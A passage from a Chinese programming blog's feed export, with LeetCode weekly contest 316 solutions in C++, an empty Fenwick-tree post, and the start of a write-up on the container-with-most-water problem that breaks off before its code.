&gt; target) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">return</span> sum % target;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tot % (i + <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">int</span> x = tot / (i + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">dfs</span>(<span class="number">-1</span>, <span class="number">0</span>, x) == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>树状数组</title>
    <url>/2022/11/02/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/47/</url>
    <content><![CDATA[<h2 id="树状数组"><a href="#树状数组" class="headerlink" title="树状数组"></a>树状数组</h2><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>算法学习</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode weekly contest 316</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/49/</url>
    <content><![CDATA[<h2 id="leetcode-weekly-contest-316"><a href="#leetcode-weekly-contest-316" class="headerlink" title="leetcode weekly contest 316"></a>leetcode weekly contest 316</h2><p>第三题和第四题还算有点意思，但是确实不太需要技巧的题目，只需要思考的题目即可。</p>
<h4 id="6214-判断两个事件是否存在冲突"><a href="#6214-判断两个事件是否存在冲突" class="headerlink" title="6214. 判断两个事件是否存在冲突"></a>6214. 判断两个事件是否存在冲突</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你两个字符串数组 <code>event1</code> 和 <code>event2</code> ，表示发生在同一天的两个闭区间时间段事件，其中：</p>
<ul>
<li><code>event1 = [startTime1, endTime1]</code> 且</li>
<li><code>event2 = [startTime2, endTime2]</code><br>事件的时间为有效的 <code>24</code> 小时制且按 <code>HH:MM</code> 格式给出。</li>
</ul>
<p>当两个事件存在某个非空的交集时（即，某些时刻是两个事件都包含的），则认为出现 冲突 。</p>
<p>如果两个事件之间存在冲突，返回 <code>true</code> ；否则，返回 <code>false</code> 。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：event1 = [&quot;01:15&quot;,&quot;02:00&quot;], event2 = [&quot;02:00&quot;,&quot;03:00&quot;]</span><br><span class="line">输出：true</span><br><span class="line">解释：两个事件在 2:00 出现交集。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：event1 = [&quot;01:00&quot;,&quot;02:00&quot;], event2 = [&quot;01:20&quot;,&quot;03:00&quot;]</span><br><span class="line">输出：true</span><br><span class="line">解释：两个事件的交集从 01:20 开始，到 02:00 结束。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：event1 = [&quot;10:00&quot;,&quot;11:00&quot;], event2 = [&quot;14:00&quot;,&quot;15:00&quot;]</span><br><span class="line">输出：false</span><br><span class="line">解释：两个事件不存在交集。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>evnet1.length == event2.length == 2.</code></li>
<li><code>event1[i].length == event2[i].length == 5</code></li>
<li><code>startTime1 &lt;= endTime1</code></li>
<li><code>startTime2 &lt;= endTime2</code></li>
<li>所有事件的时间都按照 <code>HH:MM</code> 格式给出</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-316/problems/determine-if-two-events-have-conflict/">https://leetcode.cn/contest/weekly-contest-316/problems/determine-if-two-events-have-conflict/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>数学
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>我们直接将时间转换为分钟的区间 $[l,r]$, 此时即转换为检测两个区间是否存在交集，这就非常简单的判断即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(1)$。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">change</span><span class="params">(string &amp;s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> h = (s[<span class="number">0</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + s[<span class="number">1</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="type">int</span> m = (s[<span class="number">3</span>] - <span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + s[<span class="number">4</span>] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> h * <span class="number">60</span> + m;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">haveConflict</span><span class="params">(vector&lt;string&gt;&amp; event1, vector&lt;string&gt;&amp; event2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> s1 = <span class="built_in">change</span>(event1[<span class="number">0</span>]), t1 = <span class="built_in">change</span>(event1[<span class="number">1</span>]);</span><br><span class="line">        <span class="type">int</span> s2 = <span class="built_in">change</span>(event2[<span class="number">0</span>]), t2 = <span class="built_in">change</span>(event2[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">if</span> (t1 &lt; s2 || t2 &lt; s1) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6224-最大公因数等于-K-的子数组数目"><a href="#6224-最大公因数等于-K-的子数组数目" class="headerlink" title="6224. 最大公因数等于 K 的子数组数目"></a>6224. 最大公因数等于 K 的子数组数目</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个整数数组 <code>nums</code> 和一个整数 <code>k</code> ，请你统计并返回 <code>nums</code> 的子数组中元素的最大公因数等于 <code>k</code> 的子数组数目。</p>
<p>子数组 是数组中一个连续的非空序列。</p>
<p>数组的最大公因数 是能整除数组中所有元素的最大整数。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [9,3,1,2,6,3], k = 3</span><br><span class="line">输出：4</span><br><span class="line">解释：nums 的子数组中，以 3 作为最大公因数的子数组如下：</span><br><span class="line">- [9,3,1,2,6,3]</span><br><span class="line">- [9,3,1,2,6,3]</span><br><span class="line">- [9,3,1,2,6,3]</span><br><span class="line">- [9,3,1,2,6,3]</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [4], k = 7</span><br><span class="line">输出：0</span><br><span class="line">解释：不存在以 7 作为最大公因数的子数组。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 1000</code></li>
<li><code>1 &lt;= nums[i], k &lt;= 109</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-316/problems/number-of-subarrays-with-gcd-equal-to-k/">https://leetcode.cn/contest/weekly-contest-316/problems/number-of-subarrays-with-gcd-equal-to-k/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>遍历
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>由于题目给定的数量太小，感觉直接可以遍历所有可能的连续子数组，并求出连续子数组的最大公约数即可。感觉毫无难度的题目。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n^2)$，其中 $n$ 表示给定的数组的长度。</li>
<li>空间复杂度：空间复杂度为 $O(1)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">subarrayGCD</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="type">int</span> x = nums[i];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt; n; j++) &#123;</span><br><span class="line">                x = __gcd(x, nums[j]);</span><br><span class="line">                <span class="keyword">if</span> (x == k) &#123;</span><br><span class="line">                    res++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6216-使数组相等的最小开销"><a href="#6216-使数组相等的最小开销" class="headerlink" title="6216. 使数组相等的最小开销"></a>6216. 使数组相等的最小开销</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你两个下标从 <code>0</code> 开始的数组 <code>nums</code> 和 <code>cost</code> ，分别包含 <code>n</code> 个 正 整数。</p>
<p>你可以执行下面操作 任意 次：</p>
<ul>
<li>将 <code>nums</code> 中 任意 元素增加或者减小 <code>1</code> 。</li>
<li>对第 <code>i</code> 个元素执行一次操作的开销是 <code>cost[i]</code> 。</li>
</ul>
<p>请你返回使 <code>nums</code> 中所有元素 相等 的 最少 总开销。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,3,5,2], cost = [2,3,1,14]</span><br><span class="line">输出：8</span><br><span class="line">解释：我们可以执行以下操作使所有元素变为 2 ：</span><br><span class="line">- 增加第 0 个元素 1 次，开销为 2 。</span><br><span class="line">- 减小第 1 个元素 1 次，开销为 3 。</span><br><span class="line">- 减小第 2 个元素 3 次，开销为 1 + 1 + 1 = 3 。</span><br><span class="line">总开销为 2 + 3 + 3 = 8 。</span><br><span class="line">这是最小开销。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [2,2,2,2,2], cost = [4,2,8,1,3]</span><br><span class="line">输出：0</span><br><span class="line">解释：数组中所有元素已经全部相等，不需要执行额外的操作。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>n == nums.length == cost.length</code></li>
<li><code>1 &lt;= n &lt;= 105</code></li>
<li><code>1 &lt;= nums[i], cost[i] &lt;= 106</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-316/problems/minimum-cost-to-make-array-equal/">https://leetcode.cn/contest/weekly-contest-316/problems/minimum-cost-to-make-array-equal/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>前缀和 + 滑动窗口
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>给某个题目非常相似的解法，只是稍微的变形即可，首先我们假设如果 $cost[i] &#x3D; 1$ 时，此时题目则转换为了找到一个 $x$ 使得所有元素到 $x$ 的距离之和最小，而此时我们知道数组的中位数距离到所有元素的距离最小。当然我们可以很容易的证明最终重的元素相等一定可以为数组中的某个元素，这个就非常容易证明，再此不再描述，此时我们只需要遍历出将数组中的所有元素依次变为 $nums[i]$ 的最小变换操作次数即可。</li>
<li>根据上面的描述，此时我们需要用到前缀和的操作，首先我们需要将数组中的元素按照从小到大进行排序，设 $sum[i][j]$ 表示数组元素从 $i$ 到 $j$ 的开销之和，即 $sum[i][j] &#x3D; \sum \limits <em>{k&#x3D;i}^{j}cost[k]$, 此时我们知道所有元素变为 $nums[0]$ 的代价为 $\sum \limits</em>{i &#x3D; 1}^{n-1}(nums[i] - nums[0])\times cost[i]$，此时假如目标位置移动到 $nums[1]$，此时右边减少的开销之和为 $sum[1][n-1] \times (nums[1] - nums[0])$，左边增加的开销为 $sum[0][0] \times (nums[1] - nums[0])$，此时总的开销变为 $\sum \limits_{i &#x3D; 1}^{n-1}(nums[i] - nums[0])\times cost[i] - sum[1][n-1] \times (nums[1] - nums[0]) + sum[0][0] \times (nums[1] - nums[0])$，我们可以观察到向右移动到 $nums[i]$，则当前的开销增加的内容为 $sum[0][i-1] \times (nums[i] - nums[i-1]) - sum[i][n] \times (nums[i] - nums[i-1])$，我们依次向右滑动即可。<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210232015845.png"></li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n \log n)$，$n$ 为数组的长度。</li>
<li>空间复杂度：时间复杂度为 $O(n)$。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">minCost</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, vector&lt;<span class="type">int</span>&gt;&amp; cost)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; arr;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">sum</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            arr.<span class="built_in">emplace_back</span>(nums[i], cost[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(arr.<span class="built_in">begin</span>(), arr.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            sum[i + <span class="number">1</span>] = sum[i] + arr[i].second;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> curr = <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = LONG_MAX;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            curr += (<span class="type">long</span> <span class="type">long</span>)(arr[i].first - arr[<span class="number">0</span>].first) * arr[i].second;</span><br><span class="line">        &#125;</span><br><span class="line">        ans = <span class="built_in">min</span>(ans, curr);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">long</span> <span class="type">long</span> dist = arr[i].first - arr[i - <span class="number">1</span>].first;</span><br><span class="line">            curr = curr - dist * (sum[n] - sum[i]) + sum[i] * dist;</span><br><span class="line">            ans = <span class="built_in">min</span>(ans, curr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6217-使数组相似的最少操作次数"><a href="#6217-使数组相似的最少操作次数" class="headerlink" title="6217. 使数组相似的最少操作次数"></a>6217. 使数组相似的最少操作次数</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你两个正整数数组 <code>nums</code> 和 <code>target</code> ，两个数组长度相等。</p>
<p>在一次操作中，你可以选择两个 不同 的下标 <code>i</code> 和 <code>j </code>，其中 <code>0 &lt;= i, j &lt; nums.length</code> ，并且：</p>
<ul>
<li>令 <code>nums[i] = nums[i] + 2</code> 且</li>
<li>令 <code>nums[j] = nums[j] - 2</code> 。<br>如果两个数组中每个元素出现的频率相等，我们称两个数组是 相似 的。</li>
</ul>
<p>请你返回将 <code>nums</code> 变得与 <code>targe</code>t 相似的最少操作次数。测试数据保证 <code>nums</code> 一定能变得与 <code>target</code> 相似。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [8,12,6], target = [2,14,10]</span><br><span class="line">输出：2</span><br><span class="line">解释：可以用两步操作将 nums 变得与 target 相似：</span><br><span class="line">- 选择 i = 0 和 j = 2 ，nums = [10,12,4] 。</span><br><span class="line">- 选择 i = 1 和 j = 2 ，nums = [10,14,2] 。</span><br><span class="line">2 次操作是最少需要的操作次数。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,2,5], target = [4,1,3]</span><br><span class="line">输出：1</span><br><span class="line">解释：一步操作可以使 nums 变得与 target 相似：</span><br><span class="line">- 选择 i = 1 和 j = 2 ，nums = [1,4,3] 。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,1,1,1,1], target = [1,1,1,1,1]</span><br><span class="line">输出：0</span><br><span class="line">解释：数组 nums 已经与 target 相似。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>n == nums.length == target.length</code></li>
<li><code>1 &lt;= n &lt;= 105</code></li>
<li><code>1 &lt;= nums[i], target[i] &lt;= 106</code></li>
<li><code>nums</code> 一定可以变得与 <code>target</code> 相似。</li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-316/problems/minimum-number-of-operations-to-make-arrays-similar/">https://leetcode.cn/contest/weekly-contest-316/problems/minimum-number-of-operations-to-make-arrays-similar/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> 数学问题</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>题目出的比较有想象力，仅需要基本的数学思考即可。首先我们观察一下题目，对应每个数 $nums[i]$ 它的变化只能为加 $2$ 或者减 $2$,这个就意味：</li>
</ol>
<ul>
<li>$nums[i]$ 如果为奇数，则其变化后仍然为奇数；</li>
<li>$nums[i]$ 如果为偶数，则其变化后仍然为偶数；<br>根据题意可以知道 $nums$ 与 $target$ 中的奇数与偶数的数目肯定相等，要不然无法变为相似，首先如果在</li>
<li>偶数范围内如果一个数需要变大或者变小，则我们需要在偶数或者奇数范围找到一个相应的数变小或者变大；</li>
<li>奇数范围内如果一个数需要变大或者变小，则我们需要在奇数或者范围找到一个相应的数变小或者变大；<br>按照题意要求的匹配规则，则将 $nums$ 与 $target$ 分别按照从小到大进行排序，根据贪心规则，$nums$ 中最小的元素应该变为 $target$ 中最小元素，否则变换的次数则并不为最小，由于我们知道所有的数字变大的次数与变小的次数一定相等，所有我们找到所有偶数部分中变大的次数与奇数部分中变大的次数之和即为最小的变换次数。</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log n)$，其中 $n$ 表示给定的数组的长度。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 表示给定的数组的长度。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">makeSimilar</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, vector&lt;<span class="type">int</span>&gt;&amp; target)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; arr1, arr2;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; brr1, brr2;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                arr1.<span class="built_in">emplace_back</span>(nums[i]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                arr2.<span class="built_in">emplace_back</span>(nums[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (target[i] % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                brr1.<span class="built_in">emplace_back</span>(target[i]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                brr2.<span class="built_in">emplace_back</span>(target[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(arr1.<span class="built_in">begin</span>(), arr1.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">sort</span>(arr2.<span class="built_in">begin</span>(), arr2.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">sort</span>(brr1.<span class="built_in">begin</span>(), brr1.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">sort</span>(brr2.<span class="built_in">begin</span>(), brr2.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; arr1.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr1[i] &lt; brr1[i]) &#123;</span><br><span class="line">                x += brr1[i] - arr1[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; arr2.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr2[i] &lt; brr2[i]) &#123;</span><br><span class="line">                y += brr2[i] - arr2[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (x + y) / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>11. 盛最多水的容器</title>
    <url>/2022/01/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/5/</url>
    <content><![CDATA[<h3 id="11-盛最多水的容器"><a href="#11-盛最多水的容器" class="headerlink" title="11. 盛最多水的容器"></a>11. 盛最多水的容器</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给定一个长度为 <code>n</code> 的整数数组 <code>height</code> 。有 <code>n</code> 条垂线，第 <code>i</code> 条线的两个端点是 <code>(i, 0)</code> 和 <code>(i, height[i])</code> 。</p>
<p>找出其中的两条线，使得它们与 x 轴共同构成的容器可以容纳最多的水。</p>
<p>返回容器可以储存的最大水量。</p>
<p>说明：你不能倾斜容器。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：[1,8,6,2,5,4,8,3,7]</span><br><span class="line">输出：49 </span><br><span class="line">解释：图中垂直线代表输入数组 [1,8,6,2,5,4,8,3,7]。在此情况下，容器能够容纳水（表示为蓝色部分）的最大值为 49。</span><br><span class="line">示例 2：</span><br><span class="line"></span><br><span class="line">输入：height = [1,1]</span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>n == height.length</code></li>
<li><code>2 &lt;= n &lt;= 105</code></li>
<li><code>0 &lt;= height[i] &lt;= 104</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/container-with-most-water">https://leetcode.cn/problems/container-with-most-water</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>二分查找、双指针
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>这个题目出的很好，典型的双指针解法就不说了，参考<a href="https://leetcode.cn/problems/container-with-most-water/solution/sheng-zui-duo-shui-de-rong-qi-by-leetcode-solution/">官方题解</a>, 主要谈谈二分查找的解法。</li>
<li>二分查找：</li>
</ol>
<ul>
<li>我们只需要枚举每个可能的容器的高度即可，即枚举第 $i$ 个容器的高度为 $\textit{height}[i]$。此时 $\textit{height}[i]$ 为容器的右边缘，则此时我们只需要找到容器的最小的左边缘即可，此时我们只需要找到 $j \in [0,i-1]$ 之间最小且满足 $\textit{heigth}[j] \ge \textit{height}[i]$, 找到最小的 $j$ 即可；此时 $\textit{height}[i]$ 为容器的左边缘，则此时我们只需要找到容器的最大的右边缘即可，此时我们只需要找到 $j \in [i + 1, n]$ 之间最大且满足 $\textit{heigth}[j] \ge \textit{height}[i]$, 找到最大的 $j$ 即可，有以下两种二分查找即可：<ul>
<li>设立新的数组 $left[i]$ 表示 $[0,i]$ 之间的最大值，此时我们知道 $left$ 数组一定是递增的，此时我们即可利用二分查找，找到最小 $j$ 即可，此时容器的容积为 $(i - j) \times \textit{height}[i]$；设立新的数组 $right[i]$ 表示 $[0,i]$ 之间的最大值，此时我们知道 $right$ 数组一定是递增的，此时我们即可利用二分查找，找到最大 $j$ 即可，此时容器的容积为 $(j - i) \times \textit{height}[i]$，我们直接利用二分查找完成上述即可。</li>
<li>线段树上二分，这个方法是参考<a href="https://leetcode.cn/problems/booking-concert-tickets-in-groups/solution/by-endlesscheng-okcu/">2286. 以组为单位订音乐会的门票</a> 中的线段树二分法来解决该问题的，非常好的思考方法。</li>
</ul>
</li>
</ul>
<ol start="3">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log n)$, 其中 $n$ 为数组的长度。</li>
<li>空间复杂度：$O(n)$, 其中 $n$ 为数组的长度。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><ul>
